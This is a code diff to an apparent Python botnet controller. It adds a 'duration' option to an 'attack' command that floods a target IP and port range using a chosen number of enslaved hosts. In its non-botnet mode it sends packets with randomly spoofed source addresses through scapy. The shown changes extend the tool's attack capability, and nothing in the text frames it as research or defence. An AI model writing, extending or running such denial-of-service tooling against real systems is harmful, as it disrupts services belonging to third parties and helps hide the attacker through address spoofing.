@@ -25,7 +25,7 @@ def showHelp() :
             usage : remove-slave -h\--host target_ip
                 target_ip   -   Target IP Address to Remove
         attack          -   To Start Attack
-            usage : attack -h\--host target_ip -p\--port target_port -m\--mode mode -c\--count count -s\--slaves slaves -t\--type type
+            usage : attack -h\--host target_ip -p\--port target_port -m\--mode mode -c\--count count -d\--duration duration -s\--slaves slaves -t\--type type
                 target_ip   -   Target IP to Attack
                 target_port -   Targe Port or Port Range [eg.1000 or 1000-2000]
                                 Default : 'all'
@@ -33,6 +33,8 @@ def showHelp() :
                                 Default : 'botnet'
                 count       -   Number of packets to send 
                                 Default : 100
+                duration    -   Time To Keep Attack Live (in seconds)
+                                Default : 30    
                 slaves      -   Number of Slaves to Use
                                 Default : 'all'
                 type        -   Type of Attack 
@@ -92,6 +94,7 @@ try :
 
                 mode = cmd.mode
                 count = cmd.count
+                duration = cmd.duration
                 if cmd.slaves == None or cmd.slaves == 'all' :
                     slaves = 255
                 else :
@@ -101,7 +104,7 @@ try :
                 aType = cmd.aType
 
                 if mode == 'botnet' :
-                    master.attack(target,ports,count,aType,slaves)
+                    master.attack(target,ports,count,duration,aType,slaves)
                 else :
                     "Do Virtual Send"
                     IP1 = IP(src=ipGen(),dst=target)
